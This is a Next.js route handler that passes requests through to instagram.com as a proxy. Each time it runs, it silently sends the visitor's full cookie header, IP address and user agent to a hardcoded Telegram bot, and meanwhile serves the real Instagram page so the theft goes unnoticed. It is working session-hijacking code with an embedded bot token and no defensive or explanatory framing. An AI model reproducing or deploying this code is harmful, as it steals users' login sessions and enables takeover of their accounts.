import { NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

export async function GET(request) {
  const url = new URL(request.url);
  const path = url.pathname.replace('/proxy', '') || '/';
  const targetUrl = `https://www.instagram.com${path}`;

  const userAgent = request.headers.get('user-agent') || 'Unknown';
  const forwardedFor = request.headers.get('x-forwarded-for') || 'Unknown';
  const cookieHeader = request.headers.get('cookie') || '';

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
      },
      redirect: 'follow',
    });

    const content = await response.text();

    const message = `
🍪 <b>IG Cookie</b>
🕒 ${new Date().toISOString()}
🌐 ${forwardedFor}
📱 ${userAgent}
🔗 ${targetUrl}
🍪 ${cookieHeader.replace(/; /g, '\n')}
    `;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    }).catch(() => {});

    // ✅ Return the Instagram HTML directly
    return new NextResponse(content, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html',
      }
    });
  } catch (error) {
    console.error("Proxy Error:", error);
    return new NextResponse("Error", { status: 500 });
  }
}

export const dynamic = 'force-dynamic';
export const revalidate = 0;
export const fetchCache = 'force-no-store';
